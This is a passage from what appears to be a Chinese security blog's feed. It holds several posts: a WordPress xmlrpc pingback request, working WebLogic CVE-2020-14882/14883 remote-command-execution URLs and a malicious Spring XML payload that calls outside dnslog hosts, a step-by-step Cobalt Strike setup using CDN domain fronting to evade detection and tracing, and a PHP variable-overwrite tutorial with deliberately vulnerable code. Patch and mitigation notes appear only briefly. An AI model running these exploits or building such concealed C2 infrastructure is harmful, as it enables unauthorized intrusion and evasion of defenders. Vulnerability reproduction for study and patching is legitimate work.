class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;xmlrpc.php HTTP&#x2F;1.1</span><br><span class="line">Host: www.目标.com</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko&#x2F;20100101 Firefox&#x2F;82.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Length: 310</span><br><span class="line"></span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;iso-8859-1&quot;?&gt;</span><br><span class="line">    &lt;methodCall&gt;</span><br><span class="line">    &lt;methodName&gt;pingback.ping&lt;&#x2F;methodName&gt;</span><br><span class="line">    &lt;params&gt;</span><br><span class="line">    &lt;param&gt;&lt;value&gt;&lt;string&gt;http:&#x2F;&#x2F;g8o53x.dnslog.cn&#x2F;&lt;&#x2F;string&gt;&lt;&#x2F;value&gt;&lt;&#x2F;param&gt;</span><br><span class="line">    &lt;param&gt;&lt;value&gt;&lt;string&gt;http:&#x2F;&#x2F;www.目标.com&#x2F;?p&#x3D;1&lt;&#x2F;string&gt;&lt;&#x2F;value&gt;&lt;&#x2F;param&gt;</span><br><span class="line">    &lt;&#x2F;params&gt;</span><br><span class="line">    &lt;&#x2F;methodCall&gt;</span><br></pre></td></tr></table></figure><p>DNSLOG申请地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.dnslog.cn&#x2F;</span><br></pre></td></tr></table></figure><p>发送数据包</p><p><img src="https://img-blog.csdnimg.cn/img_convert/0a6411062f6daf1980094d06f47350db.png" alt="image-20201123113059935"></p><p>验证成功</p><p><img src="https://img-blog.csdnimg.cn/20201123115237393.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h1 id="0x04-修复建议"><a href="#0x04-修复建议" class="headerlink" title="0x04 修复建议"></a>0x04 修复建议</h1><p>1、通过APACHE的.htaccess屏蔽xmlrpc.php文件的访问。配置代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># protect xmlrpc</span><br><span class="line">&lt;Files &quot;xmlrpc.php&quot;&gt;</span><br><span class="line">Order Allow,Deny</span><br><span class="line">Deny from all</span><br><span class="line">&lt;&#x2F;Files&gt;</span><br></pre></td></tr></table></figure><p>2、删除根目录下的xmlrpc.php。</p>]]></content>
      
      
      <categories>
          
          <category> WEB 漏洞复现和分析 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Weblogic（CVE-2020-14882，CVE-2020-14883） 管理控制台未授权远程命令执行漏洞</title>
      <link href="/2020/11/02/Weblogic%EF%BC%88CVE-2020-14882%EF%BC%8CCVE-2020-14883%EF%BC%89%20%E7%AE%A1%E7%90%86%E6%8E%A7%E5%88%B6%E5%8F%B0%E6%9C%AA%E6%8E%88%E6%9D%83%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
      <url>/2020/11/02/Weblogic%EF%BC%88CVE-2020-14882%EF%BC%8CCVE-2020-14883%EF%BC%89%20%E7%AE%A1%E7%90%86%E6%8E%A7%E5%88%B6%E5%8F%B0%E6%9C%AA%E6%8E%88%E6%9D%83%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="Weblogic（CVE-2020-14882，CVE-2020-14883）-管理控制台未授权远程命令执行漏洞"><a href="#Weblogic（CVE-2020-14882，CVE-2020-14883）-管理控制台未授权远程命令执行漏洞" class="headerlink" title="Weblogic（CVE-2020-14882，CVE-2020-14883） 管理控制台未授权远程命令执行漏洞"></a>Weblogic（CVE-2020-14882，CVE-2020-14883） 管理控制台未授权远程命令执行漏洞</h1><h2 id="0x01-漏洞简述"><a href="#0x01-漏洞简述" class="headerlink" title="0x01 漏洞简述"></a>0x01 漏洞简述</h2><p>2020年10月29日，360CERT监测发现 <code>Weblogic ConSole HTTP 协议代码执行漏洞,</code>该漏洞编号为 <code>CVE-2020-14882,CVE-2020-14883</code> ，漏洞等级：<code>严重</code>，漏洞评分：<code>9.8</code>。</p><p>远程攻击者可以构造特殊的<code>HTTP</code>请求，在未经身份验证的情况下接管 <code>WebLogic Server Console</code>，并在 <code>WebLogic Server Console</code> 执行任意代码。</p><h2 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02 影响版本"></a>0x02 影响版本</h2><p><code>Oracle:Weblogic</code>:</p><ul><li>10.3.6.0.0</li><li>12.1.3.0.0</li><li>12.2.1.3.0</li><li>12.2.1.4.0</li><li>14.1.1.0.0</li></ul><h2 id="0x03-漏洞详情"><a href="#0x03-漏洞详情" class="headerlink" title="0x03 漏洞详情"></a>0x03 漏洞详情</h2><h3 id="CVE-2020-14883-权限绕过漏洞"><a href="#CVE-2020-14883-权限绕过漏洞" class="headerlink" title="CVE-2020-14883: 权限绕过漏洞"></a>CVE-2020-14883: 权限绕过漏洞</h3><p>远程攻击者可以构造特殊的<code>HTTP</code>请求，在未经身份验证的情况下接管 <code>WebLogic Server Console</code>。</p><p>权限绕过漏洞（CVE-2020-14882），访问以下URL，未授权访问到管理后台页面（低权限的用户）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:7001&#x2F;console&#x2F;css&#x2F;%252e%252e%252fconsole.portal</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/94ac3fe0f55bed25ee3badfc8ebddaf3.png" alt="image-20201102104413803"></p><p>发现我们现在是低权限的用户，无法安装应用,所以组合下面的CVE-2020-14882 可以继续利用</p><h3 id="CVE-2020-14882-代码执行漏洞"><a href="#CVE-2020-14882-代码执行漏洞" class="headerlink" title="CVE-2020-14882: 代码执行漏洞"></a>CVE-2020-14882: 代码执行漏洞</h3><p>结合 <code>CVE-2020-14883</code> 漏洞，远程攻击者可以构造特殊的<code>HTTP</code>请求，在未经身份验证的情况下接管 <code>WebLogic Server Console</code> ，并在 <code>WebLogic Server Console</code> 执行任意代码。</p><h3 id="远程命令执行方法一"><a href="#远程命令执行方法一" class="headerlink" title="远程命令执行方法一"></a>远程命令执行方法一</h3><p>利用<code>com.tangosol.coherence.mvel2.sh.ShellSession</code>执行命令：（利用DNSLOG）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:7001&#x2F;&#x2F;console&#x2F;css&#x2F;%252e%252e%252fconsole.portal?_nfpb&#x3D;true&amp;_pageLabel&#x3D;&amp;handle&#x3D;com.tangosol.coherence.mvel2.sh.ShellSession(&quot;java.lang.Runtime.getRuntime().exec(&#39;curl%20xzi7ua.dnslog.cn&#39;);&quot;)</span><br></pre></td></tr></table></figure><p>成功执行：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/ea80ba6172bb9694b20aaa12dabe4eb9.png" alt="image-20201102105333842"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/997e531a5e69f55b41b7f5b32da7c203.png" alt="image-20201102113350559"></p><h3 id="远程命令执行方法二（通用性高）"><a href="#远程命令执行方法二（通用性高）" class="headerlink" title="远程命令执行方法二（通用性高）"></a>远程命令执行方法二（通用性高）</h3><p>一种更为通杀的方法，对于所有Weblogic版本均有效。</p><p>但是必须可以出网，要可以访问到恶意的xml</p><p>首先需要构造一个XML文件，并将其保存外网（漏洞机或者可访问的一台机子上）上，如<code>http://zeo.com/zeo.xml</code>：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8" ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">   <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">   <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"pb"</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span> <span class="attr">init-method</span>=<span class="string">"start"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>bash<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>&lt;![CDATA[curl fypg4w.dnslog.cn]]&gt;<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/ebd863679703b7a6650c6f1cf6932a7b.png" alt="image-20201102112847540"></p><p>然后通过如下URL，即可让Weblogic加载这个XML，并执行其中的命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;your-ip:7001&#x2F;console&#x2F;css&#x2F;%252e%252e%252fconsole.portal?_nfpb&#x3D;true&amp;_pageLabel&#x3D;&amp;handle&#x3D;com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(&quot;http:&#x2F;&#x2F;example.com&#x2F;rce.xml&quot;)</span><br></pre></td></tr></table></figure><p>成功执行：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/96c43f601ea5364256b85398260587e6.png" alt="image-20201102113029906"></p><p>收到相应包</p><p><img src="https://img-blog.csdnimg.cn/img_convert/fca6e7f846c276549e61be9f917ebfc6.png" alt="image-20201102113010871"></p><h2 id="0x05-修复建议"><a href="#0x05-修复建议" class="headerlink" title="0x05 修复建议"></a>0x05 修复建议</h2><p>及时更新补丁</p><p>参考oracle官网发布的补丁:</p><p><em><a href="https://www.oracle.com/security-alerts/cpuoct2020traditional.html" target="_blank" rel="noopener">https://www.oracle.com/security-alerts/cpuoct2020traditional.html</a></em></p>]]></content>
      
      
      <categories>
          
          <category> WEB 漏洞复现和分析 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CS通过(CDN+证书)powershell上线详细版</title>
      <link href="/2020/10/13/CS%E9%80%9A%E8%BF%87(CDN+%E8%AF%81%E4%B9%A6)powershell%E4%B8%8A%E7%BA%BF%E8%AF%A6%E7%BB%86%E7%89%88/"/>
      <url>/2020/10/13/CS%E9%80%9A%E8%BF%87(CDN+%E8%AF%81%E4%B9%A6)powershell%E4%B8%8A%E7%BA%BF%E8%AF%A6%E7%BB%86%E7%89%88/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h1><p>这个应该叫做域前置技术：</p><p>大致图示：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/3179004d6115f5f9361413a40108eed2.png" alt="image-20201012101837071"></p><ul><li>攻击流量通过CDN节点将流量转发到真实的C2服务器</li><li>CDN节点ip通过识别请求的Host头进行流量转</li><li>可以有效的躲避一些安全设备，也有这一定的反溯源功能，因为流量都去了CDN上</li></ul><p>之前看了一些文章，但是大佬有些地方觉得简单肯能就没写，自己搭建的时候就写了一些，算是我的一个笔记吧，感觉较为详细了，比较适合新手。</p><h1 id="0x01-需要资源"><a href="#0x01-需要资源" class="headerlink" title="0x01 需要资源"></a>0x01 需要资源</h1><ol><li>cobaltstrike 4.0</li><li>VPS（cs服务器）</li><li>域名</li><li>CDN</li><li>国外代理</li></ol><h1 id="0x02-域名免费申请"><a href="#0x02-域名免费申请" class="headerlink" title="0x02 域名免费申请"></a>0x02 域名免费申请</h1><p>申请地址：<a href="https://www.freenom.com/" target="_blank" rel="noopener">https://www.freenom.com/</a></p><p>重点是免费且不用备案的</p><p><img src="https://img-blog.csdnimg.cn/img_convert/e4c69bb849d45b1db6a6baeec0824326.png" alt="image-20201010175149280"></p><p>自行选择申请免费的域名</p><p><img src="https://img-blog.csdnimg.cn/img_convert/02adb485b70c5594b60991b9c22a74df.png" alt="image-20201010175235902"></p><h2 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h2><p>要挂代理，然后把个人信息的地址设置成代理的地址，要不可能申请不成功</p><p><img src="https://img-blog.csdnimg.cn/img_convert/6487e6be2598ba5dbfa43b078dba33d2.png" alt="image-20201010182351230"></p><h1 id="0x03-免费CDN准备"><a href="#0x03-免费CDN准备" class="headerlink" title="0x03 免费CDN准备"></a>0x03 免费CDN准备</h1><p>申请地址：<a href="https://dash.cloudflare.com/" target="_blank" rel="noopener">https://dash.cloudflare.com/</a></p><p>自行注册并登录设置CDN</p><p><img src="https://img-blog.csdnimg.cn/img_convert/f96d9bbff4afb77abd90f6fefd49e8b8.png" alt="image-20201010175449713"></p><h1 id="0x04-域名和CDN联动设置"><a href="#0x04-域名和CDN联动设置" class="headerlink" title="0x04 域名和CDN联动设置"></a>0x04 域名和CDN联动设置</h1><p><strong>登陆CDN,添加站点为刚刚申请的域名</strong></p><p><img src="https://img-blog.csdnimg.cn/img_convert/73b58d60b272b54b89170afff2a9282b.png" alt="image-20201010202027672"></p><p><strong>添加A记录，指向VPS的IP地址</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">类型名称 内容           TTL代理状态</span><br><span class="line">A    test 10.1.1.111（VPS地址）   自动   已代理</span><br><span class="line"></span><br><span class="line">那么这个地址就是 test.xxxxx.tk</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/9d21ee853ccd1bf45667d011352d61ce.png" alt="image-20201010202316056"></p><p><strong>记住Cloudflare 名称服务器，这个是要设置到域名那边的！</strong></p><p><img src="https://img-blog.csdnimg.cn/img_convert/082ea05252aaaf35e1f0ad4e7d0b89f4.png" alt="image-20201010202359523"></p><p><strong>找到自己的域名——管理域名——nameservers</strong></p><p><img src="https://img-blog.csdnimg.cn/img_convert/7a2b9e4a1f4ea08227c1952f1ca62373.png" alt="image-20201010182519563"></p><p>选择使用自己的域名解析：<strong>Use custom nameservers (enter below)</strong></p><p><strong>Nameserver 1、2 都写CDN提供的地址</strong></p><p><img src="https://img-blog.csdnimg.cn/img_convert/6f604af630ac0f2806ccb1d2b917a796.png" alt="image-20201010201508750"></p><p>为了实时受到我们的命令的响应:我们需要修改缓存规则：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/fca6387be039454564e0d4d3f46f6e5e.png" alt="image-20201010202805943"></p><p>保证这两项是开着的</p><p><img src="https://img-blog.csdnimg.cn/img_convert/7bffe68b08a2b32b4cdd2268589776b2.png" alt="image-20201010202943159"></p><h1 id="0x05-C2证书配置"><a href="#0x05-C2证书配置" class="headerlink" title="0x05 C2证书配置"></a>0x05 C2证书配置</h1><h3 id="首先选择证书模式：完全"><a href="#首先选择证书模式：完全" class="headerlink" title="首先选择证书模式：完全"></a>首先选择证书模式：完全</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/8276505b66a3b83eb460eac6d32136f9.png" alt="image-20201010203244193"></p><h3 id="下载证书"><a href="#下载证书" class="headerlink" title="下载证书"></a>下载证书</h3><p>生成成功保存下来,我保存的是 com.pem,com.key</p><p><img src="https://img-blog.csdnimg.cn/img_convert/d6068d2ca316bc096d1160f130e0069c.png" alt="image-20201010203449655"></p><h3 id="在VPS上生成CS可用的配置文件"><a href="#在VPS上生成CS可用的配置文件" class="headerlink" title="在VPS上生成CS可用的配置文件"></a>在VPS上生成CS可用的配置文件</h3><p>使用以下命令重新生成cobalstrike.store：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">openssl pkcs12 -export -in server.pem -inkey server.key -out spoofdomain.p12 -name 域名 -passout pass:密码</span><br><span class="line"></span><br><span class="line">例子：</span><br><span class="line">openssl pkcs12 -export -in com.pem -inkey com.key -out spoofdomain.p12 -name test.xxxxx.tk -passout pass:zzz123456</span><br></pre></td></tr></table></figure><p>使用以下命令创建证书：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">keytool -importkeystore -deststorepass 密码 -destkeypass 密码 -destkeystore new.store -srckeystore spoofdomain.p12 -srcstoretype PKCS12 -srcstorepass 密码 -alias 域名</span><br><span class="line"></span><br><span class="line">例子</span><br><span class="line">keytool -importkeystore -deststorepass zzz123456 -destkeypass zzz123456 -destkeystore new.store -srckeystore spoofdomain.p12 -srcstoretype PKCS12 -srcstorepass zzz123456 -alias test.xxxxx.tk</span><br></pre></td></tr></table></figure><p>最终生成 new.store 文件，（为cobalstrike.store的替代品）</p><p><img src="https://img-blog.csdnimg.cn/img_convert/17d7dde17a83349f0d080c4544256ce5.png" alt="image-20201010175918055"></p><h1 id="0x06-C2-profile配置"><a href="#0x06-C2-profile配置" class="headerlink" title="0x06 C2.profile配置"></a>0x06 C2.profile配置</h1><p>直接使用以下项目:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;FortyNorthSecurity&#x2F;C2concealer</span><br></pre></td></tr></table></figure><p>使用方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">安装命令：</span><br><span class="line">chmod u+x install.sh</span><br><span class="line">.&#x2F;install.sh</span><br><span class="line">使用命令:</span><br><span class="line">C2concealer --variant 1 --hostname test.domain.tk</span><br></pre></td></tr></table></figure><p>这里选择3</p><p>因为我们使用的CDN给的证书，然后输入/home/cs/new.store,这就是刚刚生成的new.store的绝对路径来。</p><p>最终会生成随机名的profile</p><p><img src="https://img-blog.csdnimg.cn/img_convert/6d0be6eda900a07a3b8f11c0582d25e4.png" alt="image-20201010180452978"></p><p>成功生成</p><p><img src="https://img-blog.csdnimg.cn/img_convert/761e77cc25cd3f729a31214b108bfdd7.png" alt="image-20201010145837473"></p><p>最后讲生成的这个随机数.profile，复制到cs目录下。</p><h1 id="0x07-启动C2"><a href="#0x07-启动C2" class="headerlink" title="0x07 启动C2"></a>0x07 启动C2</h1><h3 id="用c2lint-检查下，下面这样就是通过："><a href="#用c2lint-检查下，下面这样就是通过：" class="headerlink" title="用c2lint 检查下，下面这样就是通过："></a><strong>用c2lint 检查下，下面这样就是通过：</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;c2lint ca730a6d.profile</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/6bab1a7057868d4f4803a5f7f802b4b6.png" alt="image-20201010161604398"></p><h3 id="检查成功后，修改teamserver配置"><a href="#检查成功后，修改teamserver配置" class="headerlink" title="检查成功后，修改teamserver配置"></a>检查成功后，修改teamserver配置</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim teamserver</span><br></pre></td></tr></table></figure><p>修改最后一行的内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javax.net.ssl.keyStore&#x3D;.&#x2F;new.store （证书生成的new.store文件地址）   -Djavax.net.ssl.keyStorePassword&#x3D;zzz123456（上面证书的那个密码）</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/ad674fc579c3de6e473e1769330527e8.png" alt="image-20201010181400207"></p><h3 id="启动C2"><a href="#启动C2" class="headerlink" title="启动C2"></a>启动C2</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;teamserver 192.168.1.1 password123456 .&#x2F;C2.profile</span><br></pre></td></tr></table></figure><h1 id="0x08-配置CS"><a href="#0x08-配置CS" class="headerlink" title="0x08 配置CS"></a>0x08 配置CS</h1><p>配置一个监听器</p><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20201010215220.png" alt="image-20201010215216698"></p><p>配置一个powershell上线，注意要勾选SSL</p><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20201010215502.png" alt="image-20201010215502324"></p><h1 id="0x09-成功上线"><a href="#0x09-成功上线" class="headerlink" title="0x09 成功上线"></a>0x09 成功上线</h1><p>成功上线</p><p><img src="https://img-blog.csdnimg.cn/img_convert/91beb34e8909fa27159c292b65af429e.png" alt="image-20201010204019920"></p><h1 id="0x10-总结"><a href="#0x10-总结" class="headerlink" title="0x10 总结"></a>0x10 总结</h1><p>本次搭建是以免费的网站为主，但是实际操作起来发现，这个CDN还是有时候不太稳定，有条件的可以换个好的，但是注意要关掉缓存。</p>]]></content>
      
      
      <categories>
          
          <category> 内网安全研究 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP代码审计：变量覆盖</title>
      <link href="/2020/09/09/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9A%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/"/>
      <url>/2020/09/09/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9A%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="0x00-前提"><a href="#0x00-前提" class="headerlink" title="0x00 前提"></a>0x00 前提</h1><p>本文是给作为给小伙伴分享教学的一篇文章，给讲一下，所以写的比较简陋。。。见谅而且都比较基础，只是简单讲课提纲吧</p><h1 id="0x01-变量覆盖审计"><a href="#0x01-变量覆盖审计" class="headerlink" title="0x01 变量覆盖审计"></a><strong>0x01 变量覆盖审计</strong></h1><h3 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a><strong>0x00 简介</strong></h3><p>变量覆盖，顾名思义就是可以覆盖已有变量值，导致变量覆盖的漏洞</p><h3 id="常见的造成的代码审计的情景是代码中出现以下关键词："><a href="#常见的造成的代码审计的情景是代码中出现以下关键词：" class="headerlink" title="常见的造成的代码审计的情景是代码中出现以下关键词："></a>常见的造成的代码审计的情景是代码中出现以下关键词：</h3><ul><li>register_globals=on</li><li>extract()函数</li><li>parse_str()函数</li><li>import_request_variables()函数</li><li>$$</li></ul><h3 id="0x01-变量覆盖演示"><a href="#0x01-变量覆盖演示" class="headerlink" title="0x01 变量覆盖演示"></a><strong>0x01 变量覆盖演示</strong></h3><h4 id="extract"><a href="#extract" class="headerlink" title="extract()"></a><strong>extract()</strong></h4><p><strong><code>extract(array,extract_rules,prefix)</code>函数</strong></p><p><a href="https://www.runoob.com/php/func-array-extract.html" target="_blank" rel="noopener">https://www.runoob.com/php/func-array-extract.html</a></p><p>该函数可以从数组中将变量导入到当前的符号表，即将数组中的键值对注册成函数，使用数组键名作为变量名，使用数组键值作为变量值。</p><p>这里我们要注意一下该函数的第二个参数</p><ul><li>EXTR_OVERWRITE - 默认。如果有冲突，则覆盖已有的变量。</li><li>EXTR_SKIP - 如果有冲突，不覆盖已有的变量。</li></ul><p>这就为我们提供了覆盖的可能。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">'a'</span>;</span><br><span class="line"><span class="keyword">echo</span> $a.<span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">extract($_GET);</span><br><span class="line"><span class="keyword">echo</span> $a</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到我们初始变量值为a但是覆盖之后就变成了我们输入的值。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;test&#x2F;extract.php?a&#x3D;123</span><br></pre></td></tr></table></figure><p><img src="https://img-service.csdnimg.cn/img_convert/4f669db21f0bc23cc971d06175db4981.png" alt="image-20200907141301903"></p><p>修复：</p><p>在使用extract()函数时，可以指定将第二个参数设置为EXTRS_KIP</p><h4 id="parse-str"><a href="#parse-str" class="headerlink" title="parse_str()"></a><strong>parse_str()</strong></h4><p><strong><code>parse_str()</code>函数</strong>用于把查询字符串解析到变量中，如果没有<strong>array参数</strong>，则由该函数设置的变量将覆盖已存在的同名变量。</p><p>在没有array参数的情况下使用此函数，</p><p>并且在PHP 7.2中将废弃不设置参数的行为,此函数没有返回值。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">"giao"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"a:"</span> . $a;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">$b = $_GET[<span class="string">'b'</span>];</span><br><span class="line">parse_str($b);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"a_2:"</span> . $a;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;test&#x2F;parse_str.php?b&#x3D;a&#x3D;zeo</span><br></pre></td></tr></table></figure><p><img src="https://img-service.csdnimg.cn/img_convert/aecb348b0fc1f99298b6b59fa627becb.png" alt="image-20200907145448737"></p><h4 id=""><a href="#" class="headerlink" title="$$"></a><strong>$$</strong></h4><p>典型的例子就是<strong>foreach</strong>来遍历数组中的值作为变量。</p><p>$$是一种可变变量的写法，它可以使一个普通变量的值作为可变变量的名字，这种类型常常会使用遍历的方式来释放变量的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">foreach</span> ($_POST <span class="keyword">as</span> $k =&gt; $v)&#123;</span><br><span class="line">    $$k = $v;</span><br><span class="line">    <span class="keyword">echo</span> $a;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://img-service.csdnimg.cn/img_convert/8c093c65bd382b9c6c5f5dd06977423b.png" 